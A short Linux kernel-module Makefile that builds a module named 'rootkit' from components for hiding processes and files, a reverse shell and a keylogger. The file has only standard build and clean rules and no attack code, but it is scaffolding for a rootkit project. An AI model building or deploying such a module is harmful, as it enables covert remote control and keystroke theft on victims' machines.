obj-m	:= rootkit.o
rootkit-objs := proc_hide.o file_hide.o reverse_shell.o file_operation.o keylogger.o main.o

all:
	make -C /lib/modules/$(shell uname -r)/build/ \
	M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build/ \
	M=$(PWD) clean
